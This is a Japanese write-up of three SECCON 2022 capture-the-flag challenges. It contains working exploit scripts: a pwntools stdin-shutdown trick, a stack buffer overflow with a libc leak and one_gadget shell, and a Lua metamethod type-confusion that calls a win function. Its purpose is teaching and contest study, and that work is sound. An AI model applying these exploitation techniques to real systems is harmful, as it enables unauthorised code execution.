# SECCON 2022 Writeup

チーム `Double Lariat` で頑張って、頑張った結果、1328点で総合33位でした。
国内順位7位なんで決勝に出ます。嬉しいね。

僕が解いた問題は

- find flag
- koncha
- lslice

の三問だけなんでその解説します。

## find flag(misc)
問題

```python
#!/usr/bin/env python3.9
import os

FLAG = os.getenv("FLAG", "FAKECON{*** REDUCTED ***}").encode()

def check():
    try:
        filename = input("filename: ")
        if open(filename, "rb").read(len(FLAG)) == FLAG:
            return True
    except FileNotFoundError:
        print("[-] missing")
    except IsADirectoryError:
        print("[-] seems wrong")
    except PermissionError:
        print("[-] not mine")
    except OSError:
        print("[-] hurting my eyes")
    except KeyboardInterrupt:
        print("[-] gone")
    return False

if __name__ == '__main__':
    try:
        check = check()
    except:
        print("[-] something went wrong")
        exit(1)
    finally:
        if check:
            print("[+] congrats!")
            print(FLAG.decode())
```


本番中はよくわからず解きました。
GDBとかPythonとか、Ctrl-Cじゃ終了しないツールを終わらせるのにCtrl-Dを使っているせいで、**何に対してもCtrl-Dをする癖**があったんですが、問題に対して同じ事したらフラグが降ってきました。
リモートの場合は shutdown すると良いです。

攻撃コード
```python
from pwn import *

io = remote("find-flag.seccon.games", 10042)
io.shutdown("send")

io.interactive()
```

終わったあとにじっくり眺めてみたんですが、おそらく `input` が Ctrl-D などで死ぬとその例外が `check()` 内で捕捉されず、外部の `print("[-] something went wrong")` で捕捉されます。
ここで重要なのは `check = check()` の代入文が実行されていないところです。

**finallyはexitしても実行される**ので、check が関数オブジェクトのままチェックが入ります。当然 `if check:` は通過できる、というわけです。

この問題に限らず、 stdin が閉じるなどの操作は想定されていないことがあるので、とりあえず初動で Ctrl-D すると良いかと思われます。

## koncha(pwn/warnup)
ソースコードとlibcと**ld**が配られます。嬉しい。

問題

```c
#include <stdio.h>
#include <unistd.h>

int main() {
  char name[0x30], country[0x20];

  /* Ask name (accept whitespace) */
  puts("Hello! What is your name?");
  scanf("%[^\n]s", name);
  printf("Nice to meet you, %s!\n", name);

  /* Ask country */
  puts("Which country do you live in?");
  scanf("%s", country);
  printf("Wow, %s is such a nice country!\n", country);

  /* Painful goodbye */
  puts("It was nice meeting you. Goodbye!");
  return 0;
}

__attribute__((constructor))
void setup(void) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  alarm(180);
}
```

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

GDBでデバッグしやすい様に patchelf します。

```
cp chall patched
patchelf --replace-needed libc.so.6 /path/to/libc.so ./patched
patchelf --set-interpreter /path/to/ld.so ./patched
```

この問題にはオーバーですが、ソースコードが配られているので dwarf を生成して `./patched` にくっつけてもいいです。

```
strings ./patched | grep GCC
```

結果
```
GCC: (Ubuntu 10.3.0-1ubuntu1~20.04) 10.3.0
```

ということで、dockerを用意して全く同じ環境を用意します。その中で

```
CFLAGS=-g make
objcopy --only-keep-debug ./chall ./debug.symbol
objcopy --add-gnu-debuglink=/path/to/debug.symbol /path/to/patched
```

を実行しデバッグ情報を生成します。CTFぐらいの小さいなバイナリならこれで大丈夫です。一応 `nm` コマンドでオフセットがずれているか調べると良いです。

さて、exploitですが、自明なバッファオーバーフロー脆弱性が二箇所(scanf)あります。
更に Stack Canary も無いので楽勝ですね。ただ PIE があるのでベースアドレスのリークが必要です。

最初のscanfが `"%[^\n]s"` なので、何も入力しないとNULL終端されず未初期化の値が出てきます(libcのバージョンが違うと出てこない可能性があります)。

GDBで確認すると、それが謎の領域へのポインタであることがわかり、更にメモリマップを調べると libc に隣接してるので、libcのベースアドレスがわかります。

ROP chain 組むのも面倒なので、libc の one_gadget を探します。

```
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

実際に ret する時のレジスタを見ると、ちょうど２つ目が刺さりそうなのでオフセット計算してやるとシェルが取れます。

explot.py
```
io = remote("koncha.seccon.games", 9001)

binary = ELF('./patched', checksec=True)

def exploit():
    payload = b''
    io.sendline(payload)

    io.recvuntil(b"you, ")
    got = unpack(io.recv(6) + b'\x00\x00')
    log.info(f'got leaked address {hex(got)}')

    libc_base = got - 2036456
    assert libc_base & 0xfff == 0
    log.success(f'got libc base address {hex(libc_base)}')

    one_gadget = libc_base + 0xe3b01
    payload = b'B' * 0x50
    payload += pack(0xdeadbeef) # rbp
    payload += pack(one_gadget) # ret
    io.sendline(payload)

    io.success("we got real world")
    io.interactive()
    pass

if __name__ == '__main__':
    exploit()
```

flag

```
SECCON{I_should_have_checked_the_return_value_of_scanf}
```

## lslice
> Commit: cfbe378f906061ee56f91acfbdf569d0d3fb9556

気合で解きました。

さて、配布されたファイルを見ると patch.diff があります。また、問題文に Commit がありますが、これは Lua へのコミットで、patch のベースだと推測できます。

ということで、実際に `git apply` で patch を当て、makefileのCFLAGSに-gを追加してデバッグ情報をつけた状態でビルドします。

ELFの構造上、デバッグ情報は後ろの方にあるため、-gをつけてもつけなくてもオフセットはあんまり変わりません。なのでデバッグ情報付きのバイナリで動いたexploitがそのまま本番で通用するすることが多いです。
ただビルド環境だけは揃える必要があるので、さっきと同じ様に strings で GCC バージョンなどを確認して、docker内でビルドし、同じ様にdebuglinkを張ります。


patch の内容は大きく分けて３つあります。

- OS機能などを封じて直接コマンドを実行できないようにする
- table に対して slice という操作を追加する
- win というフラグを表示する関数を追加する

作者のptr-yudaiさんいわく、オリジナル版にはwin関数がなく、AAR,AAWで攻略するルートを想定していたようですが、僕には無理なので普通に win を使います。

追加されたslice関数は以下の通りです。

ltablib.c

```c
static int tslice (lua_State *L) {
  int i, stackpos;
  const TValue *src, *dst;
  lua_Integer len, start, end, newlen;

  /* Get table size */
  len = aux_getn(L, 1, TAB_RW); // 第一引数で与えられたテーブルの長さを取得する。
  luaL_argcheck(L, len < INT_MAX, 1, "array too big");

  /* Get start and end position */
  start = luaL_checkinteger(L, 2); // ２つ目の引数を取得する。
  if (lua_isnoneornil(L, 3)) // あるなら３つ目の引数を取得する。
    end = len + 1;
  else
    end = luaL_checkinteger(L, 3);

  /* Check start and end position */
  if (start <= 0) start = 1;
  else if (start > len) start = len;
  if (end <= 0) end = 1;
  else if (end > len + 1) end = len + 1;
  luaL_argcheck(L, start <= end, 2,
                "invalid slice range");
  // 長さのチェックを行う。

  newlen = end - start;
  stackpos = lua_gettop(L) + 1;
  // スタックトップのオフセットを計算する。

  /* Create a new array */
  lua_createtable(L, newlen, 0);
  if (len > 0 && newlen > 0) {
    src = &(L->ci->func + 1)->val; // 第一引数
    dst = &(L->ci->func + stackpos)->val; // 作成したテーブル
    for (i = end - 1; i >= start; i--) {
      hvalue(dst)->array[i - start] = hvalue(src)->array[i - 1]; // コピーを行う。
    }
  }

  return 1;
}
```

わかりやすいようにコメントを追加しました。
Lua の C 表現では、全てスタックマシンを経由して処理が行われます。第一引数、第二引数、...とスタックに積み重なっていき、新しいオブジェクトを生成する時はこの上に乗ります。
例えば、stackposは、lua_gettop でスタックのサイズを取得したあと、更に1加算することで**次に作られるオブジェクトの位置**を指し示すことになります。
lua_createtable はスタックのてっぺんにテーブルを作りますので、stackposはこれを指します。

この関数に脆弱性が存在しない様に思えます(インデックス周りのチェックが少し甘く、len=0,start=10,end=-10で変な状態が作れますが、使えません)。なので多分直接脆弱性があるタイプではなく、APIの間違った使用をしているタイプでしょう。

len が壊れていたら全部バグるので、取得している部分を詳しく見ると `luaL_len` という関数が呼ばれています。

```
len = aux_getn(L, 1, TAB_RW); // 第一引数で与えられたテーブルの長さを取得する。

#define aux_getn(L,n,w) (checktab(L, n, (w) | TAB_L), luaL_len(L, n))
```

[ドキュメント](http://milkpot.sakura.ne.jp/lua/lua53_manual_ja.html#luaL_len)を読むと、

```
lua_Integer luaL_len (lua_State *L, int index);
指定されたインデックスの値の「長さ」を数値として返します。 これはLuaの '#' 演算子と同等です (§3.4.7 を参照)。 演算の結果が整数でない場合はエラーが発生します。 (これはメタメソッドが呼ばれた場合にのみ発生します。)
```


メタメソッドというのがあるらしいです。ふーん。

```
x = {"A", "B"}

print(#x) -- 2

setmetatable(x, {__len = function() return 100 end})

print(#x) -- 100

-- ﾋﾞｸｯ　 ∧_∧
-- 　　 ∑(ﾟдﾟ*) ﾌｧｯ?‼
-- 　 　 ⊂　 ⊂)
-- 　　   υ￣ υ
```

どうやら、テーブルに対して独自の振る舞いをさせる手段があって、luaL_len は内部でそれを呼んでいるらしいです。つまり実際の配列の長さとの整合性がない...

ということで、これを使ってlenをバグらせ、偽のオブジェクトを生成しましょう。
実際、このxから30~40とかをsliceしてきて表示しようとするとセグフォで落ちます。
これは、srcのarrayの外側にある不正なデータがコピーされてしまっているからだと考えられ、exploitの方針が立ちました。

コピーしている array は lobject.h 内の Table に定義があります。

lobject.h:726
```c
typedef struct Table {
  CommonHeader;
  lu_byte flags;  /* 1<<p means tagmethod(p) is not present */
  lu_byte lsizenode;  /* log2 of size of 'node' array */
  unsigned int alimit;  /* "limit" of 'array' array */
  TValue *array;  /* array part */
  Node *node;
  Node *lastfree;  /* any free position is before this position */
  struct Table *metatable;
  GCObject *gclist;
} Table;
```

さらに TValue は

lobject.h:65

```c
#define TValuefields	Value value_; lu_byte tt_

typedef struct TValue {
  TValuefields;
} TValue;
```

そして 

```c
/*
** Union of all Lua values
*/
typedef union Value {
  struct GCObject *gc;    /* collectable objects */
  void *p;         /* light userdata */
  lua_CFunction f; /* light C functions */
  lua_Integer i;   /* integer numbers */
  lua_Number n;    /* float numbers */
  /* not used, but may avoid warnings for uninitialized value */
  lu_byte ub;
} Value;
```

どうやら、TValueの `tt_` がオブジェクトのタイプで、それに応じて内部の union を使い分けている様です。
テーブルにCの関数(table.packとか)を入れてみた感じ、22(0x16)を入れておくと lua_CFunction f が呼ばれます。

コピー元arrayの範囲外には大量のゴミがあり、それらがどこから来たのか追う気力がなかったためどうしようか悩んでいたのですが、テーブル内にあるデータが残っている様な振る舞いを見せたので、winを呼ぶ偽のTValueを文字列として大量に保存(string.rep)し、GDBを見ながら無事に呼べそうなオフセットを探したところ、見つかりました。

最終的なコードは以下になります。

```lua
pack_address = tonumber(string.sub(tostring(table.pack), 13), 16)

print(string.format("%x", pack_address))
binary_base = pack_address - 0x0000000000027220

win = binary_base + 0x0000000000007a40
print("found win:" .. string.format("%x", win))

function int_to_array(v)
  ret = {}
  for i = 0, 7 do
    table.insert(ret, v & 0xff)
    v = v >> 8
  end

  return ret
end

function utf8_from(t)
  local bytearr = {}
  for _, v in ipairs(t) do
    local utf8byte = v
    table.insert(bytearr, string.char(utf8byte))
  end
  return table.concat(bytearr)
end

st = utf8_from(int_to_array(win))
st = st .. '\x16\x16\x16\x16\x16\x16\x16\x16'
print(string.len(st))
st = string.rep(st, 100)
print(string.len(st))


string_data = "HELLO"
change_me = table.pack

x = {
  "A", "B",
  st,
  "C", "D"
}

-- size = 2147483647
size = 1000

custom_functions = {}
function custom_functions.__len(a)
  return size - 1
end

setmetatable(x, custom_functions)

print("WHEREAMI")

offset = 59
s = table.slice(x, offset - 10, offset + 10, win, '\x22')

s[1]()
```

コメントを一つ外したりなにか条件が変わると動かなくなる不安定さがあり、力不足を感じる...


```
55db7efed220
found win:55db7efcda40
16
1600
WHEREAMI
SECCON{D1d_y0u_wr1t3_st4bl3_3xpl01t_w1th0ut_Pwn1ng_glibc_h34p?}
[+] Done!
[*] Got EOF while reading in interactive
```

まぁ通せたからええ。

# 感想
10solve以下の問題通したの初めてで嬉しい。
babyfileも通したかった
